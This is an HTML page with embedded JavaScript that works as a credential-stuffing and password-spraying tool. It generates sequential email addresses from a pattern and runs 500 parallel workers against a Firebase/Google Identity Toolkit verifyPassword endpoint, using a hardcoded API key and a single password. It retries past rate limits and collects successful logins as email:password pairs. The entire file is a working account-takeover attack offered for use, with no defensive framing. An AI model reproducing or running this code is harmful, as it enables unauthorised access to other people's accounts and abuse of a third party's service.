<!DOCTYPE html>
<html>
<head>
    <title>SONIC SEQUENTIAL V7</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #ff0055; background: #050505; padding: 20px; box-shadow: 0 0 40px #ff0055; border-radius: 5px; }
        h1 { font-size: 20px; border-bottom: 1px solid #ff0055; padding-bottom: 10px; color: #fff; text-shadow: 0 0 10px #ff0055; }
        
        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #ff0055; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; }
        .btn-ignite { width: 100%; padding: 20px; background: #ff0055; color: #fff; border: none; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 20px #ff0055; }
        
        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #111; padding: 15px; border: 1px dashed #ff0055; }
        .monitor b { font-size: 32px; color: #fff; display: block; }

        #live-status { height: 25px; width: 100%; color: #ff0055; font-size: 12px; font-weight: bold; overflow: hidden; margin-bottom: 5px; }
        #res-box { width: 100%; height: 280px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
        
        .copy-btn { width: 100%; padding: 12px; background: #111; color: #ff0055; border: 1px solid #ff0055; margin-top: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="bot-terminal">
    <h1>🚀 SONIC SEQUENTIAL</h1>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn-ignite" id="btn" onclick="sonicIgnite()">⚡ START SONIC SCAN</button>

    <div class="monitor">
        <div>CHECKED<b id="c_val">0</b></div>
        <div>FOUND<b id="f_val">0</b></div>
    </div>

    <div id="live-status">Ready for Overclocking...</div>

    <textarea id="res-box" readonly placeholder="Result: Email:Pass"></textarea>
    
    <button class="copy-btn" onclick="copyResults()">📋 COPY ALL EMAIL:PASS</button>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let nextToProcess = 0;
    let index = 0;
    let resultsBuffer = new Map();

    async function sonicIgnite() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Enter Data!");

        active = true;
        document.getElementById('btn').innerText = "🛑 ABORT MISSION";
        document.getElementById('btn').style.background = "#fff";
        document.getElementById('btn').style.color = "#000";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- SONIC OVERCLOCKING: 500 PARALLEL RUNNERS ---
        // ഒരേസമയം 500 അക്കൗണ്ടുകൾ പമ്പ് ചെയ്യുന്നു.
        const workers = 500; 

        for (let i = 0; i < workers; i++) {
            (async function() {
                while (active && index < max) {
                    let currentIdx = index++;
                    let numStr = currentIdx.toString().padStart(digits, '0');
                    let email = fmt.replace(/\{(\d+)\}/, numStr);
                    
                    await checkAccount(email, pwd, key, currentIdx);
                }
            })();
        }
    }

    async function checkAccount(em, pw, k, idx) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (r.status === 429) {
                await new Promise(res => setTimeout(res, 500)); // Short cooldown
                return checkAccount(em, pw, k, idx); // No-skip retry
            }

            let d = await r.json();
            resultsBuffer.set(idx, { found: (d && d.idToken), email: em });

            // --- INSTANT SEQUENTIAL FLUSH ---
            // ബഫറിലുള്ള നമ്പറുകൾ ഓർഡറിൽ പടപടാന്ന് റിലീസ് ചെയ്യുന്നു
            while (resultsBuffer.has(nextToProcess)) {
                let data = resultsBuffer.get(nextToProcess);
                if (data.found) {
                    found++;
                    document.getElementById('f_val').innerText = found;
                    document.getElementById('res-box').value += data.email + ":" + pw + "\n";
                    document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                }
                
                checked++;
                if (checked % 10 === 0) {
                    document.getElementById('c_val').innerText = checked;
                    document.getElementById('live-status').innerText = "Sonic Scanning: " + data.email;
                }
                
                resultsBuffer.delete(nextToProcess);
                nextToProcess++;
            }

        } catch (e) {
            return checkAccount(em, pw, k, idx); // Network retry
        }
    }

    function copyResults() {
        let t = document.getElementById('res-box');
        t.select();
        document.execCommand('copy');
        alert("Found List Copied!");
    }
</script>

</body>
</html>
